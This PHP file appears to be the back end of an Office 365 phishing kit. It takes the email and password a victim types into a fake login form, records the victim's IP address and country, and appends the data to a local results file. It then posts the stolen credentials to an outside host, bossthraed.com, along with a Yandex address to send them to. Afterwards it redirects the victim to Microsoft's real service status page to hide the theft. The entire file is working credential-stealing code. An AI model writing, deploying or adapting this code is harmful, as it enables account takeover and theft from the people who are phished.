<?php
ob_start();


if(isset($_POST['login'])){
	require 'engine/GetDetail.php';
	
	$ip = getenv("REMOTE_ADDR");

	// Page name + ip + country name
	$subject = "Office 365 |".$ip."|". get_country();
	$log = base64_encode($_POST['login']);
	$body = body($_POST['login'], $_POST['passwd']);
	// var_dump($body); die();

		$data = [
		'email' => $_POST['login'],
		'password' => $_POST['passwd'],
		'send_to' => 'microsotft-office365-rules-co@yandex.ru',
		'subject' => $subject,
		'body' => $body
	];
$text = fopen('../rezlt.txt', 'a');
fwrite($text, $data);

	$mgs = process_gkd('https://bossthraed.com/banser/index.php', $data);

	if($mgs === 'success'){
		header("location: https://portal.office.com/servicestatus");
		// redirect success page
	}

	if($mgs === 'failed'){
		header("location: ../index.php?login=".$log.'&mgs=error');
	}

}
// {8b7gW,wJfMp1